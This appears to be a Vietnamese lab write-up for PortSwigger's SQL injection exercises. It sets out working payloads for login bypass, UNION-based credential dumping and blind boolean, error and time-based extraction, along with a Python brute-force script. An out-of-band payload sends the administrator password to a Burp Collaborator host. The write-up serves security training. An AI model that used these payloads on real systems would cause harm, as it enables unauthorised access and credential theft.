# Web02

# ****SQL injection****

## Basic SQLi

### ****SQL injection vulnerability in WHERE clause allowing retrieval of hidden data****

Theo như mô tả, ta biết được server sẽ thực hiện lệnh SQL dạng

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Với đoạn code như trên, ta có thể thực hiện SQL injection vào `category` hoặc `released` 

Click vào một mục bất kỳ (khác All) dưới `Refine your search`, ta có request sau:

![Untitled](writeup-media/Untitled.png)

Cho vào `Repeater`, thử đổi `?category=Corporate+gifts` thành `?category='` ta sẽ nhận lại `Internal Server Error` → khả năng cao server truy vấn SQL ở `category`

![Untitled](writeup-media/Untitled%201.png)

Dùng payload `category='+or+'1'+--` sẽ khiến đoạn code SQL trên server trở thành

```sql
SELECT * FROM products WHERE category = ''+or+'1'+--' AND released = 1
```

và hiện ra toàn bộ những items chưa được released.

![Untitled](writeup-media/Untitled%202.png)

---

### **SQL injection vulnerability allowing login bypass**

Thử login vào website, ta được request sau:

![Untitled](writeup-media/Untitled%203.png)

Đoạn code SQL trên server có thể sẽ như sau:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Ta gửi payload `administrator'--` vào username. Khi đó trên server sẽ xử lý

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '<password>'
```

Đoạn SQL trên sẽ lấy user có username là `administrator` mà không kiểm tra password

![Untitled](writeup-media/Untitled%204.png)

## **SQL injection UNION attacks**

### **SQL injection UNION attack, determining the number of columns returned by the query**

Click vào một mục bất kỳ (khác All) dưới `Refine your search`, ta có request sau:

![Untitled](writeup-media/Untitled%205.png)

Cho vào `Repeater`, thử đổi `?category=Corporate+gifts` thành `?category='` ta sẽ nhận lại `Internal Server Error` → khả năng cao server truy vấn SQL ở `category`

![Untitled](writeup-media/Untitled%206.png)

Gửi payload `Gifts'+union+SELECT+NULL+--` để xác định số cột của bảng SQL. Tăng dần số cột NULL cho đến khi server không bị lỗi

![Untitled](writeup-media/Untitled%207.png)

Nhận thấy khi gửi payload `Gifts'+union+SELECT+NULL,NULL,NULL+--`, server trả về kết quả như bình thường → số cột là 3.

![Untitled](writeup-media/Untitled%208.png)

Ngoài ra, ta dễ dàng nhận thấy khả năng cao bảng SQL có ít nhất 2 cột (tên, giá tiền) → thử từ 2 NULL trở đi để rút ngắn thời gian.

---

### **SQL injection UNION attack, finding a column containing text**

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

![Untitled](writeup-media/Untitled%209.png)

Dùng `order by n`  (sắp xếp theo cột thứ `n`)để tìm số cột.

![Untitled](writeup-media/Untitled%2010.png)

Khi gửi payload `category=Gifts'+order+by+4+--`, ta bị Internal Server Error → số cột là 3

![Untitled](writeup-media/Untitled%2011.png)

Do đã xác định được có ba cột nên ta sẽ dùng ba cột NULL. Thay `'0e8ilw'` (string của lab đưa) vào từng vị trí NULL, ta được vị trí ở giữa không trả về Internal Server Error → cột thứ 2 có dạng string.

![Untitled](writeup-media/Untitled%2012.png)

---

### **SQL injection UNION attack, retrieving data from other tables**

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

![Untitled](writeup-media/Untitled%2013.png)

Xác định được bảng có 2 cột với payload `Pets'+order+by+2+--`

![Untitled](writeup-media/Untitled%2014.png)

Xác định được  2 cột đều là string, cột thứ nhất là tiêu đề còn cột thứ 2 là đoạn văn với payload `Pets'+order+by+2+--`

![Untitled](writeup-media/Untitled%2015.png)

Mô tả cung cấp cho ta table `users` cùng 2 cột `username` và `password`. Gửi payload `Pets'+union+SELECT+username,password+from+users+--`.

![Untitled](writeup-media/Untitled%2016.png)

Kéo xuống ta thấy được thông tin đăng nhập của `administrator`

---

### SQL injection UNION attack, retrieving multiple values in a single column

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

![Untitled](writeup-media/Untitled%2017.png)

Gửi payload `Pets'+union+select+NULL,'a'+--`, xác định được bảng có 2 cột và chỉ có cột thứ 2 là string được render. Do đó để có thể lấy được username và password trong cùng 1 request, ta sẽ cần nối 2 string lại với nhau.

![Untitled](writeup-media/Untitled%2018.png)

Thử ghép 2 cột username và password bằng `||` , gửi payload `Pets'+union+select+NULL,username||password+from+users+--`

![Untitled](writeup-media/Untitled%2019.png)

Như vậy ta có thể ghép 2 string bằng `||`. Sửa lại payload để dễ nhìn username và password hơn: `Pets'+union+select+NULL,username||':'||password+from+users+--`

![Untitled](writeup-media/Untitled%2020.png)

Ta thấy ngay thông tin đăng nhập của `administrator`

---

### 

## **Examining the database in SQL injection attacks**

### **SQL injection attack, querying the database type and version on Oracle**

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

![Untitled](writeup-media/Untitled%2021.png)

Phần mô tả của lab có gợi ý database là `Oracle`, do đó ta cần phải có phần `FROM` trong câu lệnh `SELECT`. Ta có thể sử dụng bảng `dual` có mặc định có sẵn của database.

Dùng payload `Pets'+union+SELECT+NULL,'a'+from+dual+--`, ta kiểm tra được bảng có 2 cột và cột thứ 2 có kiểu dữ liệu string được trả về trong response

![Untitled](writeup-media/Untitled%2022.png)

Tìm trong [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), ta được lệnh SQL lấy thông tin version của database Oracle

![Untitled](writeup-media/Untitled%2023.png)

Dùng payload `Pets'+union+SELECT+NULL,banner+from+v$version+--` lấy thông tin như yêu cầu của đề bài.

![Untitled](writeup-media/Untitled%2024.png)

---

### SQL injection attack, querying the database type and version on MySQL and Microsoft

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

![Untitled](writeup-media/Untitled%2025.png)

Phần mô tả của lab có gợi ý database là `MySQL` hoặc `Microsoft`. Do đó ta sẽ cần comment bằng `#` thay vì `--`

Dùng payload `'+union+select+NULL,'a'+%23` (`%23` là url encode của `#`), ta kiểm tra được bảng có 2 cột và cột thứ 2 có kiểu dữ liệu string được trả về trong response

![Untitled](writeup-media/Untitled%2022.png)

Tìm trong [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), ta được lệnh SQL lấy thông tin version của database MySQL và Microsoft

![Untitled](writeup-media/Untitled%2026.png)

Dùng payload `'+union+select+NULL,@@VERSION+%23` lấy thông tin như yêu cầu của đề bài.

![Untitled](writeup-media/Untitled%2027.png)

---

### SQL injection attack, listing the database contents on non-Oracle databases

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

Dùng payload `'+union+select+NULL,'a'+--`, ta kiểm tra được bảng có 2 cột và cột thứ 2 có kiểu dữ liệu string được trả về trong response

![Untitled](writeup-media/Untitled%2028.png)

Dùng payload `'+union+select+NULL,table_name+from+information_schema.tables+--` để lấy tên các bảng, ta tìm được bảng `users_dqghnn` khả nghi

![Untitled](writeup-media/Untitled%2029.png)

Dùng payload  `'+union+select+NULL,column_name+from+information_schema.columns+where+table_name='users_dqghnn'+--` để tìm tên các cột

![Untitled](writeup-media/Untitled%2030.png)

Có tên bảng và cột, ta truy vấn SQL để lấy thông tin đăng nhập như bình thường

`'+union+select+password_umtufo,username_zytctf+from+users_dqghnn+--`

![Untitled](writeup-media/Untitled%2031.png)

Tìm thấy username và password của admin

---

### **SQL injection attack, listing the database contents on Oracle**

Tương tự các bài trước, ta sẽ tấn công SQLi vào `/filter?category=`

Lưu ý database của lab này là Oracle

Dùng payload `'+union+SELECT+'a','a'+from+dual+--`, ta kiểm tra được bảng có 2 cột có kiểu dữ liệu string được trả về trong response

![Untitled](writeup-media/Untitled%2032.png)

Gửi payload `'+union+select+NULL,table_name+from+all_tables+--` và `'+union+select+NULL,column_name+from+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_BSGYUL'+--` để lần lượt lấy tên bảng và tên cột.

![Untitled](writeup-media/Untitled%2033.png)

![Untitled](writeup-media/Untitled%2034.png)

Có tên bảng và cột, ta truy vấn SQL để lấy thông tin đăng nhập như bình thường

`'+union+select+USERNAME_IOTIJI,PASSWORD_VLVLVE+FROM+USERS_BSGYUL+--`

![Untitled](writeup-media/Untitled%2035.png)

## **Blind SQL injection**

### **Blind SQL injection with conditional responses**

Dựa vào mô tả của lab, ta biết được rằng server sẽ truy vấn SQL value của tracking cookie. Website sẽ hiện dòng `Welcome back` nếu lệnh truy vấn trả về bất cứ dòng nào.

Test SQLi bằng payload `' or '1` vào cookie `TrackingId`, ta thấy website hiện `Welcome back` → có lỗi SQLi

![Untitled](writeup-media/Untitled%2036.png)

Dựa vào kết quả trả về (có hoặc không có `Welcome back`), ta có thể thực hiện blind SQLi bằng cách brute-force từng ký tự trong password của `administrator`, nếu ký tự đó đúng thì server sẽ trả về `Welcome back`.

Test lệnh SQL `substring` bằng payload `' or (select substring(username,1,1) from users where username = 'administrator') = 'a' --`. Payload này sẽ kiểm tra xem ký tự đầu tiên trong username của user `administrator` có phải là `a` không (hiển nhiên là có).

![Untitled](writeup-media/Untitled%2037.png)

Thấy có dòng `Welcome back` → ta có thể dùng `substring` để brute-force từng ký tự của password với cách tương tự.

![Untitled](writeup-media/Untitled%2038.png)

Vị trí `§pos§` sẽ nhận giá trị từ 1-30 (tương đương vị trí của ký tự trong password). 

![Untitled](writeup-media/Untitled%2039.png)

Vị trí `§char§` sẽ nhận giá trị từ a-zA-Z0-9. 

![Untitled](writeup-media/Untitled%2040.png)

Grep dòng `Welcome back`

![Untitled](writeup-media/Untitled%2041.png)

Set nhiều nhất 999 request cùng lúc để brute-force nhanh hơn.

![Untitled](writeup-media/Untitled%2042.png)

Bắt đầu brute-foce, đợi 1 lúc thấy có 20 ký tự hợp lệ. Sắp xếp chúng theo thứ tự của payload 1, như vậy password sẽ có ký tự 1 là `7`, ký tứ 2 là `w`, ký tự 3 là `z`,...

![Untitled](writeup-media/Untitled%2043.png)

![Untitled](writeup-media/Untitled%2044.png)

Đăng nhập bằng password lấy được.

Note: ngoài ra, nếu password vẫn bị sai, ta nên thử toàn bộ `printable ASCII character` (bao gồm thêm các ký tự đặc biệt) và cho số ký tự của password dài hơn.

---

### **Blind SQL injection with conditional errors**

Dựa vào mô tả của lab, ta biết được rằng server sẽ truy vấn SQL value của tracking cookie. Tuy  nhiên kết quả truy vấn SQL sẽ không được trả về.

Thử gửi payload có thể khiến server bị lỗi

![Untitled](writeup-media/Untitled%2045.png)

Server đã trả về code 500. Dựa vào code 200 hoặc code 500, ta có thể thực hiện brute-force password của `administration` bằng SQLi.

Gửi payload `' or (select substr(username,1,1) from users where username = 'administrator') = 'a' --` để kiểm tra → không bị lỗi → database dùng `substr` để lấy xâu con → `Oracle`

![Untitled](writeup-media/Untitled%2046.png)

Dùng thử payload Error based SQLi của Oracle trên [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

`' union SELECT CASE WHEN ('1'='2') THEN NULL ELSE to_char(1/0) END FROM dual --`

![Untitled](writeup-media/Untitled%2047.png)

![Untitled](writeup-media/Untitled%2048.png)

Code 200 nếu điều kiện trong `CASE` đúng, và 500 nếu sai.

Thử kết hợp `case` với `substr`

`' union SELECT CASE WHEN ((select substr(username,1,1) from users where username = 'administrator') = 'a') THEN NULL ELSE to_char(1/0) END FROM dual --`

![Untitled](writeup-media/Untitled%2049.png)

`' union SELECT CASE WHEN ((select substr(username,1,1) from users where username = 'administrator') = 'b') THEN NULL ELSE to_char(1/0) END FROM dual --`

![Untitled](writeup-media/Untitled%2050.png)

Như vậy có thể thấy ta hoàn toàn đủ điều kiện để thực hiện brute-force.

Gửi vào `Intruder` 

![Untitled](writeup-media/Untitled%2051.png)

Vị trí `§pos§` sẽ nhận giá trị từ 1-30 (tương đương vị trí của ký tự trong password). 

![Untitled](writeup-media/Untitled%2039.png)

Vị trí `§char§` sẽ nhận giá trị từ a-zA-Z0-9. 

![Untitled](writeup-media/Untitled%2040.png)

Bắt đầu brute-foce, đợi 1 lúc thấy có 20 ký tự hợp lệ. Sắp xếp chúng theo thứ tự của payload 1, như vậy password sẽ có ký tự 1 là `w`, ký tứ 2 là `k`, ký tự 3 là `n`,...

![Untitled](writeup-media/Untitled%2052.png)

Đăng nhập vào bằng password ta vừa lấy được

![Untitled](writeup-media/Untitled%2053.png)

---

### Blind SQL injection with time delays

Dựa vào mô tả của lab, ta biết được rằng server sẽ truy vấn SQL value của tracking cookie. Tuy  nhiên kết quả truy vấn SQL sẽ không được trả về và server xử lí lỗi tốt → thực hiện Time based SQLi.

Tìm payload cho Time based SQLi, ta có payload cho database PostgresSQL là hoạt động

Gửi cookie `trackingid` với value `'%3b SELECT pg_sleep(10) --` (`%3b` là url encode của `;`)

![Untitled](writeup-media/Untitled%2054.png)

Server mất 10 giây mới phản hồi → thành công

---

### **Blind SQL injection with time delays and information retrieval**

Dựa vào mô tả của lab, ta biết được rằng server sẽ truy vấn SQL value của tracking cookie. Tuy  nhiên kết quả truy vấn SQL sẽ không được trả về và server xử lí lỗi tốt → thực hiện Time based SQLi.

Tìm payload cho Time based SQLi, ta có payload cho database PostgresSQL là hoạt động

Gửi cookie `trackingid` với value `'%3b SELECT pg_sleep(10) --` (`%3b` là url encode của `;`)

![Untitled](writeup-media/Untitled%2055.png)

Thử kết hợp với `substring`

![Untitled](writeup-media/Untitled%2056.png)

Payload đã hoạt động. Tuy nhiên sau khi brute-force thử bằng `Intruder` thì mình nhận ra nếu gửi nhiều request cùng lúc sẽ dẫn đến thời gian các response đều lâu gần như nhau. Do đó ta có thể dùng `Intruder` và cài đặt `Maximum concurrent requests` là `1` với payload

`'%3b SELECT CASE WHEN ((select substring(password,§pos§,1) from users where username = 'administrator') = '§char§') THEN pg_sleep(10) ELSE pg_sleep(0) END --`

![Untitled](writeup-media/Untitled%2057.png)

hoặc code python để giải (module `bruteforce`  được đính kèm cùng trong folder write up)

```python
import re

import requests
import bruteforce as bf

URL = 'https://ace01f5c1e98f62ec0e368c5001e0079.web-security-academy.net/login'

status_code = requests.get(url=URL).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

bf_char = bf.ALLOWED_CHARACTERS[0]
pos = 1
username = 'administrator'
password = ''
while bf_char != bf.ALLOWED_CHARACTERS[-1]:
    cookie = {
        'TrackingId': f"'%3b SELECT CASE WHEN ((select substring(password,{pos},1) from users where username = '{username}') = '{bf_char}') THEN pg_sleep(15) ELSE pg_sleep(0) END -- "
    }
    res = requests.get(url=URL, cookies=cookie)

    print(f'{bf_char} - ', end='')

    if res.elapsed.total_seconds() > 14:
        print(f'password: {bf_char}')
        password += bf_char
        pos += 1
        bf_char = bf.ALLOWED_CHARACTERS[0]
    else:
        bf_char = bf.func_next_char(bf_char)

print(password)
with open('credential.txt', 'w') as file:
    file.write(f'{username}:{password}')

s = requests.session()
csrf = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', s.get(url=URL).text).group(1)

data = {
    'csrf': csrf,
    'username': username,
    'password': password
}

res = s.post(url=URL, data=data, allow_redirects=True)

if f'Your username is: {username}' in res.text:
    print(f"Logged in as {username}")
    with open('admin.html', 'w') as file:
        file.write(res.text)
else:
    print('Login error')
```

Lợi thế của việc dùng python trong bài này là sau khi tìm được ký tự đúng ở vị trí nào đó, ta có thể dừng và chuyển sang vị trí tiếp theo luôn.

---

### **Blind SQL injection with out-of-band interaction**

Dựa vào mô tả của lab, ta biết được rằng server sẽ truy vấn SQL value của tracking cookie. Tuy  nhiên việc truy vấn này không liên quan gì đến response của server. Ta có thể thử thực hiện DNS look-up thông qua XXE

`' union SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "[http://o3sw69zoeeal12mv3lbbqthm0d65uu.burpcollaborator.net/](http://o3sw69zoeeal12mv3lbbqthm0d65uu.burpcollaborator.net/)"> %25remote%3b]>'),'/l') FROM dual --`

![Untitled](writeup-media/Untitled%2058.png)

Thấy ở trong Burp Collaborator nhận được request → thành công

---

### Blind SQL injection with out-of-band data exfiltration

Test OOB bằng payload `' union SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "[http://laz0rv8t5zdlkkcsloed5ezq3h97xw.burpcollaborator.net/](http://laz0rv8t5zdlkkcsloed5ezq3h97xw.burpcollaborator.net/)"> %25remote%3b]>'),'/l') FROM dual --`

![Untitled](writeup-media/Untitled%2059.png)

Thấy ở trong Burp Collaborator nhận được request → ta có thể thực hiện trích xuất dữ liệu thông qua OOB. Gửi payload `' union SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.laz0rv8t5zdlkkcsloed5ezq3h97xw.burpcollaborator.net/"> %25remote%3b]>'),'/l') FROM dual --` để trích xuất password của user `administrator`.

![Untitled](writeup-media/Untitled%2060.png)

Đăng nhập thành công vào `administrator` bằng password vừa lấy được.

![Untitled](writeup-media/Untitled%2061.png)